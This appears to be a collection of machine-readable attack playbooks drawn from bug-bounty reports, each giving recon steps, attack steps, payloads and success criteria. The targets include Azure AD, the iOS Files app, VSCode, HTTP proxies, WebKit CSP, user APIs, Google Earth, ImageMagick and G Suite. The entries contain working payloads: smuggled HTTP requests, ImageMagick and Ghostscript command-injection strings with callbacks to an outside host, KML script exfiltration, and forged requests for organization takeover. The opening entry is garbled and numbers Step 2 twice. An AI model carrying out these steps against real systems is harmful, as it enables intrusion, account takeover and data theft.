trigger_conditions.when_to_apply: When application registration certificates used by CredManifest are stored in Azure Active Directory.
prerequisites: The target environment utilizes Azure Active Directory and the CredManifest functionality.

Step 2: Investigate the use of CredManifest or similar application registration certificate management tools within the Azure environment.

Step 2: Attempt to gain unauthorized access to Azure AD where these certificates are stored.
Step 3: Extract the stored application registration certificates.
tools_recommended: Azure AD reconnaissance tools
Tools for interacting with Azure APIs
Tools for extracting secrets from cloud storage
success_indicators: Unauthorized access to Azure AD tenant.
Successful retrieval of application registration certificate data.
failure_indicators: Inability to access Azure AD tenant.
No sensitive certificate data found or accessible.
Reported vulnerability does not apply to the specific configuration.

meta.title: Arbitrary local file read via zip file and symlinks on iOS Files app

affected_components: File handling within the iOS Files app

trigger_conditions.when_to_apply: This technique is applicable when the target allows uploading and extracting ZIP archives within a file management application that supports symlinks or has vulnerabilities in its ZIP handling.
prerequisites: Ability to create and upload a ZIP file to the target iOS device.
Access to the iOS Files app on the target device.
applicability_signals: The target environment is iOS.
The target application is a file manager (e.g., Apple's Files app).
The application processes user-uploaded ZIP archives.
skip_if: The target environment does not support ZIP file extraction.
The target application sanitizes or rejects ZIP files containing symlinks.

recon_steps: Step 1: Identify that the target is an iOS device and the Files app is available.
Step 2: Verify if the Files app allows importing and extracting ZIP archives.
attack_steps: Step 1: On a macOS or Unix-like system, create a directory structure for the ZIP file.

Step 2: Within the created directory, create symbolic links to sensitive files on the iOS filesystem (e.g., /private/etc/group, /private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist).
Step 3: Create a ZIP archive that includes these symbolic links, ensuring the zip command used supports symlinks (e.g., `zip --symlinks -r symlinks.zip .`).
Step 4: Transfer the created `symlinks.zip` file to the target iOS device (e.g., via AirDrop, iCloud Drive).
Step 5: On the iOS device, navigate to the Files app, locate `symlinks.zip` in the Downloads folder, and extract it.
Step 6: Navigate into the extracted folder containing the symbolic links.
Step 7: Attempt to access and transfer the content of the files pointed to by the symbolic links back to a computer (e.g., via AirDrop, iDrop).
tools_recommended: macOS Terminal or any Unix-like shell for ZIP creation and symlink management
AirDrop or iCloud Drive for file transfer to iOS device
success_indicators: Successful extraction of the ZIP file on the iOS device.
Ability to access and view the content of the files that were symlinked (e.g., /etc/group, preference plists) by accessing the symlinks within the extracted directory.
Content of sensitive files is displayed or transferred successfully.
failure_indicators: ZIP file extraction fails.
Symlinks are not created or are rendered non-functional within the extracted archive on iOS.
Accessing the symlinks results in an error or shows no content.
A security mechanism or WAF blocks the extraction or access to symlinked files.

playbooks.impact: Attacker can read arbitrary files on the iOS filesystem that the Files app has read access to, potentially leading to the extraction of sensitive information such as PII, contact lists, main phone numbers, and iCloud emails.
playbooks.key_lesson: When handling archive files (like ZIP), ensure robust sanitization and validation of file entries, especially symbolic links, to prevent arbitrary file reads and directory traversal vulnerabilities.

meta.title: The tale of CVE-2021–34479 (VSCode XSS)

trigger_conditions.when_to_apply: When the target application uses Electron and has a feature that previews user-controlled HTML content, especially if the Content Security Policy (CSP) nonce generation is predictable or weak.
prerequisites: Attacker must be able to control the content of a Markdown file that will be previewed within VSCode.
applicability_signals: Presence of a Markdown preview feature.
Code review reveals predictable nonce generation for CSP in WebView content.
The `previewContentProvider.ts` file is present and handles HTML rendering.
skip_if: If the CSP nonce generation is cryptographically secure and unpredictable.
If the Markdown preview feature is not present or does not render user-controlled HTML.

recon_steps: Step 1: Identify Electron applications within the target scope.
Step 2: Look for features that render user-controlled HTML, such as Markdown previews or rich text editors.
Step 3: Review the source code for these features, specifically focusing on how Content Security Policy (CSP) is implemented and how nonces are generated for script execution within WebViews.
attack_steps: Step 1: Analyze the nonce generation logic in `previewContentProvider.ts` (or equivalent).
Step 2: Determine if the nonce generation is predictable (e.g., relies on weak entropy like milliseconds, sequential values).
Step 3: Develop a script to generate a rapid sequence of possible nonces within a short time window.
Step 4: Create a Markdown file containing `<script>` tags with these generated nonces.
Step 5: Use a secondary script or manual method to repeatedly update the Markdown file with the generated nonces within the identified time window (e.g., every 4 seconds for 2 seconds).
Step 6: Trigger the Markdown preview feature within VSCode to open the crafted Markdown file.
tools_recommended: Custom NodeJS script for generating nonces and updating Markdown files.
Burp Suite (if intercepting network requests is relevant, though not primary for this local exploit).
success_indicators: Execution of arbitrary JavaScript code within the Markdown preview WebView (e.g., `alert()` box appears).
The script payload successfully executes and performs the intended action.
failure_indicators: No JavaScript execution occurs, and the script tags are ignored or rendered as plain text.
VSCode becomes unresponsive or crashes due to excessive file updates or script execution attempts (indicating a need to tune the nonce generation and update frequency).

playbooks.impact: Arbitrary JavaScript code execution within the VSCode Markdown preview, which could lead to further exploitation if the WebView has elevated privileges or access to sensitive data within the VSCode environment.
playbooks.key_lesson: When analyzing Electron applications, scrutinize predictable or low-entropy nonce generation for Content Security Policies, especially in features that render user-controlled HTML content.

meta.title: Keybase App Vulnerability: Retained Exploded Messages in Keybase Clients for macOS and Windows

affected_components: Chat feature, specifically the 'explode' message functionality

trigger_conditions.when_to_apply: This vulnerability is applicable when a user is using a Keybase desktop client version older than 5.9.0 and the 'explode' message feature is used in a shared chat.
prerequisites: Access to a Keybase account logged into a desktop client (macOS or Windows).
Access to another account within the same chat or the ability to communicate with another user in the chat.
applicability_signals: Keybase desktop client is running.
Chat feature with 'explode' option is available and being used.
skip_if: Keybase desktop client version is 5.9.0 or newer.
The 'explode' message feature is not in use.

recon_steps: Step 1: Identify the version of the Keybase desktop client being used.
Step 2: Confirm that the 'explode' message feature is active and functioning in a chat.
attack_steps: Step 1: As User A, send a message in a shared chat using the Keybase desktop client.
Step 2: Initiate the 'explode' action for the sent message.
Step 3: While the desktop client is still running, log out of User A and log in as User B on the same desktop client.
Step 4: If the message was exploded by any user (including User A on mobile or another user on desktop) while User A was logged out and User B was logged in on the desktop client, observe the chat.
Step 5: Log back into User A on the same desktop client.
Step 6: Navigate to the chat where the message was sent and exploded. Observe if the message is still visible.
payloads_or_patterns: N/A - This is a functional exploit, not payload-based.
tools_recommended: Keybase Desktop Client (versions < 5.9.0)
Multiple Keybase accounts for testing within the same chat
Virtual machine for simulating different operating systems (e.g., Windows 10 VM on macOS)
success_indicators: The 'exploded' message remains visible in the chat for User A on the desktop client after logging back in, even though it should have been self-destructed.
failure_indicators: The 'exploded' message is successfully deleted from User A's desktop client. This indicates the exploit did not work, likely due to a patched version or a different usage pattern.
The exploit does not work if User A is truly logged out of the desktop client, rather than switching accounts via the account switcher.

playbooks.impact: Sensitive chat messages that were intended to be deleted ('exploded') can be retained and read by an attacker who has access to the chat and the victim's desktop client. This leads to unauthorized disclosure of confidential information.
playbooks.key_lesson: When testing message destruction features like 'explode', simulate states where the client might miss the deletion signal, such as sleep, logout/login cycles, or account switching.

meta.title: T-Reqs: HTTP Request Smuggling with Differential Fuzzing
meta.authors: Bahruz Jabiyev, Steven Sprecher, Kaan Onarlioglu, Engin Kirda

trigger_conditions.when_to_apply: When a web server processes HTTP requests and exhibits differential behavior in how it parses requests based on subtle variations in header order or content, which is common in many web server implementations.
prerequisites: Target server must be accessible via HTTP/HTTPS.
Target server must be vulnerable to HTTP Request Smuggling.
applicability_signals: Existence of an HTTP endpoint that accepts POST requests with a body.
Ability to observe distinct responses for slightly different POST requests.
Presence of HTTP headers like `Content-Length` and `Transfer-Encoding` being processed by the server.
skip_if: WAF blocks all suspicious request patterns.
Server consistently returns identical responses for all variations of the same request.
Server does not support `POST` requests or HTTP/1.1 features.

recon_steps: Step 1: Identify potential endpoints that accept POST requests and process input. This can be done by crawling the target application or by observing network traffic.

Step 2: For identified POST endpoints, send requests with varying `Content-Length` and `Transfer-Encoding` header combinations. Observe the server's response for any anomalies or deviations from expected behavior.

Step 3: Specifically, test for CL.TE and TE.CL vulnerabilities by sending requests with both `Content-Length` and `Transfer-Encoding` headers set, and observe if the server processes them differently.
attack_steps: Step 1: Send a crafted HTTP request to the target with a `Transfer-Encoding: chunked` header and a `Content-Length` header. The body should contain a chunked encoding prefix followed by a smuggled request.
Step 2: The smuggled request will be appended to the actual request processed by the backend server. This smuggled request can be designed to exploit other vulnerabilities.

Step 3: Observe the response from the backend server. The success of the smuggling technique is indicated by the backend server processing the smuggled request, which may lead to different responses than expected for the initial request.
payloads_or_patterns:
POST /path HTTP/1.1
Host: <TARGET_URL>
Content-Length: 4
Transfer-Encoding: chunked

0

GET /smuggled_path HTTP/1.1
Host: <TARGET_URL>
Foo: bar
tools_recommended: Burp Suite with the HTTP Request Smuggler extension for automated detection and exploitation.
Custom scripts using libraries like `requests` in Python for precise control over HTTP headers and payloads.
success_indicators: The backend server processes the smuggled request, leading to an unexpected response (e.g., retrieving sensitive information, accessing unauthorized resources).
Observing duplicate responses or responses that differ significantly from what the initial request should produce.
A second request (the smuggled one) being visible in server logs or triggering an action that the original request did not.
failure_indicators: Consistent 4xx or 5xx errors, or identical responses for all smuggled request attempts. This might indicate a WAF blocking the attack or a server that correctly handles HTTP parsing.
No discernible difference in server responses across various payload attempts, suggesting the server is not vulnerable to this specific smuggling technique.

playbooks.impact: Allows an attacker to bypass security controls, access unauthorized data, or perform actions on behalf of other users by tricking the front-end server into forwarding malicious requests to the back-end server.
playbooks.key_lesson: Always test HTTP request parsing for inconsistencies between front-end and back-end servers, especially when both `Content-Length` and `Transfer-Encoding` headers are present, as this can lead to HTTP Request Smuggling vulnerabilities.

meta.title: Exploiting CSP in Webkit to Break Authentication & Authorization

trigger_conditions.when_to_apply: When a web application uses CSP and Single Sign-On (SSO) with cross-site redirects, and the browser engine has a vulnerability in its CSP violation reporting that leaks redirect URIs.
prerequisites: Target application utilizes SSO with redirect-based authentication.
Target application implements Content Security Policy (CSP).
applicability_signals: Browser engine used is WebKit.
CSP is configured with `report-uri` or similar violation reporting mechanisms.
Application performs cross-site redirects during authentication or authorization flows.
skip_if: No CSP implemented on the target application.
No SSO or redirect-based authentication used.
Browser is not WebKit-based or the specific CSP vulnerability is patched.

recon_steps: Step 1: Identify if the target application uses SSO and cross-site redirects for authentication/authorization by observing network traffic during login or account creation flows.
Step 2: Check if the target application implements CSP by inspecting HTTP response headers for `Content-Security-Policy`.
Step 3: Verify if the browser environment is WebKit-based (e.g., Safari on macOS/iOS, or any browser on iOS).
Step 4: Look for CSP violation reports being sent (e.g., `report-uri` directive in CSP header) and analyze their content for leaked information.
attack_steps: Step 1: Trigger a CSP violation within the target application's SSO flow by attempting to navigate to a disallowed resource or trigger a redirect to a malicious domain.
Step 2: Intercept the CSP violation report sent by the browser.
Step 3: Analyze the CSP violation report for leaked cross-site destination URIs, which may contain sensitive tokens or codes.
Step 4: Use the leaked codes/tokens from the report to authenticate as the victim user or perform unauthorized actions.
payloads_or_patterns: Inject a link or script that attempts to load a resource from an attacker-controlled domain, designed to trigger a CSP violation during a redirect.
Example CSP violation report analysis: Look for patterns like `blockedURI` or `originalPolicy` containing redirect URLs with parameters like `code`, `token`, `access_token`.
tools_recommended: Burp Suite or OWASP ZAP: To intercept and analyze HTTP requests and responses, including CSP headers and violation reports.
Browser Developer Tools: To observe network traffic, CSP configurations, and JavaScript execution.
A simple web server to receive CSP violation reports.
success_indicators: CSP violation report contains a redirect URI with sensitive information (e.g., auth codes, tokens).
Successfully using the leaked code/token to gain unauthorized access to a user's account.
Ability to perform actions on behalf of the victim user.
failure_indicators: No CSP violation reports are generated, or they do not contain leaked redirect URIs (e.g., CSP is not vulnerable, or no SSO redirect occurs). Suggestion: Investigate other CSP bypass techniques or different attack vectors.
CSP violation reports are generated but do not contain exploitable information. Suggestion: Refine the CSP violation trigger or look for alternative sensitive data leaks.

playbooks.impact: Account takeover, unauthorized access to sensitive user data, ability to perform actions on behalf of the victim user, CSRF attacks.
playbooks.key_lesson: When applications use SSO with cross-site redirects and CSP, carefully analyze CSP violation reports for leaked sensitive information that could lead to account takeover.

meta.title: Chaining Improper Authentication to IDOR and No Rate Limit for Mass Account Takeover

trigger_conditions.when_to_apply: When an authenticated user can access user data via an API endpoint and CSRF tokens can be bypassed, and there are no rate limits on API requests.
prerequisites: Attacker has an authenticated session.
Target API uses numeric user IDs.
applicability_signals: API endpoint `/api/v1/users/<id>` exists.
Requests to `/api/v1/users/<id>` initially return 401 Unauthorized.
CSRF token is present in requests.
Ignoring the CSRF token allows a 200 OK response with user data.
The user ID is a numeric value that can be enumerated.
No rate limiting is observed on API endpoints.
skip_if: Rate limiting is strictly enforced on API endpoints.
CSRF tokens are validated server-side and cannot be bypassed.
User IDs are not sequential or easily guessable (e.g., UUIDs).

recon_steps: Step 1: Authenticate to the target application and observe API requests using Burp Suite.
Step 2: Identify API endpoints that interact with user data, such as `/api/v1/users/id`.
Step 3: Send requests to these endpoints to determine authentication requirements and response codes (expecting 401 Unauthorized initially).
Step 4: Analyze request headers for CSRF tokens and attempt to remove them to bypass weak authentication.
Step 5: Confirm IDOR by successfully retrieving data for another user after removing the CSRF token and modifying the user ID.
Step 6: Test for rate limiting by sending a large number of identical requests in rapid succession. Observe if the server responds with rate limiting headers or status codes.
attack_steps: Step 1: Create an authenticated session for the attacker's account.
Step 2: Identify a user ID from a legitimate request (e.g., during password reset or account info retrieval). Let this be `<TARGET_USER_ID>`.
Step 3: Craft a request to `/api/v1/users/<TARGET_USER_ID>`, ensuring the CSRF token is removed.
Step 4: Send the request and confirm a 200 OK response containing sensitive user information.
Step 5: Leverage the knowledge of no rate limiting and the identified IDOR vulnerability.
Step 6: Using Burp Suite Intruder or a custom script, enumerate a range of numeric user IDs (e.g., 000-999 or 0000-9999) and send requests to `/api/v1/users/<ENUMERATED_ID>` without the CSRF token.
payloads_or_patterns:
Request: GET /api/v1/users/<TARGET_USER_ID>
Headers:
  Cookie: <SESSION_TOKEN>
  ... (other necessary headers, excluding CSRF token)
tools_recommended: Burp Suite: For intercepting, analyzing, and modifying HTTP requests, and for using Intruder to brute-force user IDs.
Custom script (Python, etc.): For automating the process of sending a large volume of requests and parsing responses.
success_indicators: Receiving 200 OK responses for enumerated user IDs.
Response bodies contain sensitive user information such as session tokens, user IDs, and plaintext passwords for accounts other than the attacker's.
Mass account takeover is achieved by collecting credentials and session tokens.
failure_indicators: All enumerated IDs return 401 Unauthorized or 403 Forbidden even after removing the CSRF token, suggesting a different authentication mechanism or validation.
Rate limiting is detected, preventing mass enumeration. Pivot to a different attack vector or focus on finding an alternative entry point.
User IDs are not sequential or easily guessable. Attempt alternative ID enumeration techniques (e.g., UUID fuzzing).

playbooks.impact: Full account takeover for multiple users, including access to their session tokens and plaintext passwords, enabling complete control over their accounts and potentially leading to further compromise of sensitive data or actions performed on their behalf.
playbooks.key_lesson: Always test API endpoints for IDOR by attempting to bypass CSRF tokens and enumerate identifiers, especially when rate limiting is absent, as this can lead to mass account takeover.

meta.title: Write Up – Google VRP Bug Bounty: /etc/environment Local Variables Exfiltrated On Linux Google Earth Pro Desktop App

trigger_conditions.when_to_apply: When Google Earth Pro Desktop app on Linux can be made to parse a crafted KML file that allows script execution.
prerequisites: Attacker can provide a KML file to the target user.
The KML file can reference local files using the `file://` scheme.
applicability_signals: The presence of KML file handling in the application.
The ability to inject HTML/JS code within KML descriptions.
The application running on a Linux environment.
skip_if: The application does not process KML files.
The application sanitizes or prevents script execution within KML descriptions.
The target system is not Linux.

recon_steps: Step 1: Identify that Google Earth Pro Desktop app processes KML files.
Step 2: Confirm the application is running on a Linux host.
Step 3: Inspect KML file structure to understand how descriptions are handled and if script tags are permitted.
attack_steps: Step 1: Create a KML file with a placemark.
Step 2: Within the placemark's description, use CDATA to inject JavaScript.
Step 3: Inject a script tag referencing a local file with a JS-compatible format, e.g., `<script src=file:../../../../../../../etc/environment></script>`.
Step 4: Inject further JavaScript to exfiltrate relevant environment variables by reading them from the `window` object or directly accessing them if they are parsed as JS variables.
Step 5: Send the crafted local file path to an attacker-controlled server using an image tag or another script that transmits data, e.g., `/?[VAR1]=&[VAR2]=>`.
Step 6: Instruct the victim to open the crafted KML file with Google Earth Pro Desktop.
tools_recommended: Netcat: To set up a listener on an attacker-controlled server to receive exfiltrated data.
Burp Suite: To craft and analyze HTTP requests if the exfiltration method involves HTTP.
Text Editor: To create and modify KML files.
success_indicators: Receiving network requests on the attacker's listener (e.g., Netcat) containing the contents of `/etc/environment` or specific environment variables like `PATH` and `JAVA_HOME`.
The Google Earth Pro application displaying an XSS confirmation message as part of the exploit.
failure_indicators: The KML file fails to load or display the placemark.
No network traffic is observed on the attacker's listener after the KML file is opened.
The application shows an error message related to script execution or file access.
Response: Suggest trying to exfiltrate other local files if `/etc/environment` is not directly parsable or accessible.

playbooks.impact: Exfiltration of sensitive local environment variables from the `/etc/environment` file on the Linux Google Earth Pro Desktop app. These variables may contain paths, configuration settings, or other sensitive information that could be leveraged in further attacks.
playbooks.key_lesson: When desktop applications parse untrusted file formats like KML, always test for local file inclusion and script execution vulnerabilities, especially if they allow referencing local files via custom schemes.

meta.title: Unrestricted File Upload Leads to SSRF and RCE

tech_stack_fingerprints: Presence of ImageMagick library (indicated by CVE-2016-3714 and CVE-2016-3718)

trigger_conditions.when_to_apply: When a web application allows file uploads and is identified as using a vulnerable version of ImageMagick.
prerequisites: Target application must have a file upload feature.
Target application must be using a vulnerable version of ImageMagick.
Attacker must have an authenticated session.
applicability_signals: Burp Suite's file upload scanner reports vulnerability to CVE-2016-3714.
Application processes uploaded images.
skip_if: File upload is strictly validated and rejects files with malicious content.
WAF blocks requests containing ImageMagick exploit payloads.

recon_steps: Step 1: Use Burp Suite's scanner or manual testing to identify file upload functionality.
Step 2: Attempt to upload various file types and observe response. Use Burp's file upload scanner to check for known vulnerabilities, specifically CVE-2016-3714.
attack_steps: Step 1: If ImageMagick vulnerability (CVE-2016-3714) is confirmed, set up a listener (e.g., Burp Collaborator) for SSRF testing.
Step 2: Craft a malicious image file using the ImageMagick SVG exploit for SSRF. The payload involves injecting a 'url()' function within SVG tags to redirect an external request.
Step 3: Upload the crafted image file to the target application.
Step 4: Monitor the listener for incoming connections, confirming SSRF.
Step 5: If SSRF is confirmed, attempt RCE by modifying the SVG payload to execute commands. Inject commands using the '|' operator or other ImageMagick-specific syntax.
Step 6: Upload the RCE-payload crafted image and check for command execution via the listener or other observable side effects (e.g., file creation, network activity).
payloads_or_patterns: For SSRF: SVG content like '<svg><image href="http://<COLLABORATOR_HOST>"/></svg>' or using push/pop graphic-context with url().
For RCE via CVE-2016-3714: SVG content like 'push graphic-context viewbox 0 0 640 480 fill 'url(https://example.com/image.jpg";|ls "-la)' pop graphic-context
For RCE via Ghostscript: '%!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if legal mark /OutputFile (%pipe%nslookup <COLLABORATOR_HOST>) currentdevice putdeviceprops'
tools_recommended: Burp Suite (Scanner, Intruder, Collaborator)
ImageMagick CLI (for crafting exploit images)
Custom scripts for payload generation and monitoring
success_indicators: Received callback on Burp Collaborator (for SSRF).
Execution of commands (e.g., 'ls -la' output visible in response or via a callback) confirming RCE.
failure_indicators: No callback received on Burp Collaborator, indicating SSRF payload is blocked or not processed. Pivot: Try different ImageMagick commands or other file upload exploit vectors.
Command execution payload does not result in observable command execution. Pivot: Try blind RCE techniques or other Ghostscript exploits.

playbooks.impact: Remote Code Execution (RCE) on the server, allowing attacker to execute arbitrary commands. Server-Side Request Forgery (SSRF) allowing attacker to make requests to internal or external resources on behalf of the server.
playbooks.key_lesson: Always scrutinize file upload functionality for vulnerabilities related to image processing libraries like ImageMagick, as they can lead to critical RCE and SSRF flaws.

meta.title: Practical HTTP Header Smuggling: Sneaking Past Reverse Proxies to Attack AWS and Beyond

target_profile.technology: Web applications with front-end/back-end server chains (e.g., reverse proxies, load balancers, WAFs, API Gateways)
affected_components: HTTP request handling, specifically headers processed by front-end and back-end servers differently
tech_stack_fingerprints: Presence of reverse proxies, load balancers, WAFs, or API Gateways in the request chain
Server responses that differ based on header formatting or presence

trigger_conditions.when_to_apply: This technique is applicable when a web application uses a chain of HTTP servers (front-end and back-end) and there's a discrepancy in how these servers interpret or process specific HTTP headers, particularly 'Content-Length'.
prerequisites: The target must have a discernible HTTP request chain (e.g., a public-facing proxy before the main application server).
The ability to send crafted HTTP requests to the target.
applicability_signals: The target responds differently to requests with valid and invalid 'Content-Length' headers.
The target responds differently to requests with a 'Content-Length' header and requests without it (if the body length is implicitly determined by another mechanism like 'Transfer-Encoding').
Observing distinct responses when a 'Content-Length' header is slightly malformed or obfuscated.
skip_if: The target consistently returns the same response for all 'Content-Length' header variations, indicating uniform processing by all servers in the chain.
A WAF or security appliance consistently blocks requests with malformed or unusual headers.

recon_steps: Step 1: Identify the target's HTTP server chain by sending requests with various 'Content-Length' values (valid, invalid, absent) and observing response codes and content.

Step 2: Send requests with mutated 'Content-Length' headers (e.g., 'Content-Length : 10', 'Content-Length:10', 'Content-Length 	: 10', 'Content-Length : 0') and compare responses to determine if the front-end or back-end server is sensitive to these mutations.

Step 3: If mutations cause different responses, attempt to send a request that the front-end server processes as one request but the back-end server processes as two, by manipulating 'Content-Length' and the request body.
attack_steps: Step 1: Construct a request where a 'Content-Length' header is mutated (e.g., 'Content-Length: X' where X is a value that would normally cause an error or be ignored by the front-end).

Step 2: Immediately following this malformed header, append a second, valid HTTP request within the body of the first request. The goal is for the front-end to parse the first 'Content-Length' as defining the size of the initial request, and then forward the entire payload to the back-end. The back-end, seeing the second request within the payload, processes it independently.

Step 3: The second, smuggled request can then target sensitive endpoints or manipulate application logic, such as bypassing IP restrictions by smuggling a request with a trusted IP header, or poisoning the cache by injecting a malicious response.
payloads_or_patterns:
# Example of a potential CL.CL request smuggling attempt:
GET /some/path HTTP/1.1
Host: <TARGET_URL>
Content-Length: 4

POST /smuggled HTTP/1.1
Host: <TARGET_URL>
Content-Length: 100

<smuggled_payload>
tools_recommended: Burp Suite: Use the Repeater and Intruder modules to craft and send various header mutations and request combinations. Observer extensions can help analyze nuanced response differences.
HTTP request generator scripts (e.g., Python with 'requests' or 'httpx'): For automated testing of a wide range of header mutations and sequences.
success_indicators: The smuggled request is executed by the back-end server, leading to an unexpected response (e.g., access to data normally restricted by IP, a cached response that should not be there, or an error indicative of unexpected request parsing).
Observing a callback from a tool like Burp Collaborator if the smuggled request is designed to trigger an external interaction.
A change in behavior that cannot be explained by the intended request, such as a response containing data from a different user or session.
failure_indicators: Consistent 400 Bad Request errors or server-side errors for all tested mutations, indicating the front-end or back-end is robust against these specific smuggling techniques. Suggestion: Investigate other smuggling techniques like TE.CL or different header mutations.
No difference in responses regardless of header mutations, suggesting a single-server architecture or uniform header processing. Suggestion: Move to other vulnerability classes.

playbooks.impact: Bypass IP-based access controls (e.g., on AWS API Gateway), leading to unauthorized access to sensitive APIs or internal services. Cache poisoning, allowing an attacker to serve malicious content to other users by manipulating cached responses. Potential for request smuggling attacks that can lead to arbitrary request execution on the back-end server.
playbooks.key_lesson: When dealing with HTTP request chains, always test how front-end and back-end servers interpret and process headers differently, especially 'Content-Length', by using mutations and malformed values to uncover potential header smuggling vulnerabilities.

meta.title: Becoming A Super Admin In Someone Elses Gsuite Organization And Taking It Over

target_profile.technology: Google Workspace (formerly G Suite) via domains.google.com

trigger_conditions.when_to_apply: When the attacker can initiate the process of adding a new user or administrator to a G Suite organization through domains.google.com.
prerequisites: Attacker has an account on domains.google.com.
Target has a G Suite organization managed through domains.google.com.
applicability_signals: The user creation process involves multiple sequential HTTP requests.
Network traffic during user creation shows parameters that might be manipulable to target a different G Suite organization.
skip_if: The user creation process is protected by strong CSRF tokens that are validated server-side.
All parameters controlling the target organization or user ID are deeply embedded in client-side JavaScript and not easily manipulable.

recon_steps: Step 1: Navigate to domains.google.com and attempt to initiate the process of creating a new G Suite subscription or adding a user/admin to an existing subscription.
Step 2: Monitor network traffic (e.g., using browser developer tools or Burp Suite) for requests made during the user/admin creation process, paying close attention to POST requests to /batchrpc.
Step 3: Identify parameters within the JSON payloads of these requests that seem to correlate with user identifiers, domain names, or subscription IDs.
attack_steps: Step 1: Intercept the series of POST requests to /batchrpc initiated when adding a user/admin through domains.google.com.
Step 2: Analyze the JSON payload of the requests to identify parameters that define the target G Suite organization and the user being added (e.g., domain names, user IDs, subscription IDs).

Step 3: Craft a modified request by substituting the target organization's domain or relevant identifiers with those of an arbitrary G Suite organization (e.g., changing `testdomain4534.com` to `<TARGET_ORG_DOMAIN>`).
Step 4: Send the modified request sequence to the server.
Step 5: If successful, the attacker's user would be added as a Super Admin to the target G Suite organization.
payloads_or_patterns:
POST /batchrpc HTTP/1.1
Host: domains.google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Content-Type: application/json

{"method":"serve","params":"{\"1\":{\"1\":\"https://domains.google.com/registrar#chp=z,d&z=e&d=5896212,<TARGET_ORG_DOMAIN>\",\"2\":\"<REQUEST_CORRELATION_ID>\"},\"3\":{\"1\":72,\"2\":{},\"74\":{\"1\":\"5896212\",\"2\":\"<TARGET_ORG_DOMAIN>\",\"3\":[{\"2\":{\"1\":\"<TARGET_ORG_DOMAIN>\",\"2\":\"1337.baby\",\"3\":\"1337\",\"4\":\"baby\",\"5\":2}}],\"4\":1}}}","xsrf":""}

POST /batchrpc HTTP/1.1
Host: domains.google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Content-Type: application/json

{"method":"serve","params":"{\"1\":{\"1\":\"https://domains.google.com/registrar#chp=z,d&z=e&d=5896212,<TARGET_ORG_DOMAIN>\",\"2\":\"<REQUEST_CORRELATION_ID>\"},\"3\":{\"1\":38,\"2\":{},\"40\":{\"1\":{\"1\":\"3703203\",\"3\":[{\"1\":6,\"7\":{\"1\":\"<TARGET_ORG_DOMAIN>\",\"4\":2,\"6\":{\"1\":\"<TARGET_ORG_DOMAIN>\",\"2\":\"1337.baby\",\"3\":\"1337\",\"4\":\"baby\",\"5\":2}}},\"5\":\"en-US\"},\"2\":\"USD\"}}}","xsrf":""}
tools_recommended: Burp Suite: Intercept and modify HTTP requests, specifically the /batchrpc calls.
Browser Developer Tools: Monitor network requests and responses.
success_indicators: The attacker can log in to the target G Suite organization with Super Admin privileges.
The attacker's newly created user account appears in the target G Suite organization's admin console with Super Admin roles.
Successful addition of the attacker's user as an admin to the target G Suite organization.
